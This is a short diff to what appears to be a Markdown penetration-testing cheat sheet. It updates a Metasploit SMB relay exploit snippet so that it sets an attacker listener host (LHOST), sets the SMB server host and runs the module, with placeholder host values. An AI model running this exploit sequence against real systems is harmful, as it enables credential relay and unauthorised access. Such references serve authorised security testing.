@@ -518,7 +518,9 @@ msfconsole
 use exploit/windows/smb/smb_relay
 show options
 
-set SMBHOST <Target Host>
+set LHOST <Attack Host>
+set SMBHOST <SMB Server Host
+run
 ```
 
 ### SMTP
